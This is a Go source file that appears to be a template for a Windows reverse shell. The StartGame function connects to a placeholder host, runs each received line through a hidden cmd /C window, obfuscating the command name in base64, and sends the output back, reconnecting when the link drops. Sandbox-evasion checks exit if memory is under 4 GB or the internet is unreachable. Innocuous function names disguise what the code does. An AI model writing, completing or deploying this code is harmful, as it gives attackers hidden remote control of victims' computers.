package main
import (
	"bufio"
	"net"
	"os/exec"
	"syscall"
	"time"
	b64 "encoding/base64"
	"github.com/pbnjay/memory"
	"os"
    "net/http"
	
)

//add_main_here

func swim() (string)  {
	hello := "change_this_please"  
	
	return hello
}


func ball(){

	if memory.TotalMemory() < 4000000000{
		os.Exit(4)
	}
}
func size() {
    _, err := http.Get("https://google.com")
if err != nil {
    os.Exit(4)
}
}

func StartGame() {
		host := "127.0.0.1:443"
		c, err := net.Dial("tcp", host)
		if nil != err {
			if nil != c {
				c.Close()
			}
			time.Sleep(time.Minute)
			StartGame()
		}
		num1 := 5
		num2 := 20
		if num1 + num2 != 25 {
		os.Exit(4)
		}
	
		
		r := bufio.NewReader(c)
		for {
			order, err := r.ReadString('\n')
			if nil != err {
				c.Close()
				StartGame()
				return
			}
			decode_ccmmdd, _ := b64.StdEncoding.DecodeString("Y21k")
			decode_CC, _ := b64.StdEncoding.DecodeString("L0M=")
	
			cmd := exec.Command(string(decode_ccmmdd), string(decode_CC), order)
			cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			out, _ := cmd.CombinedOutput()
	
			c.Write(out)
		}
	
}
	
	
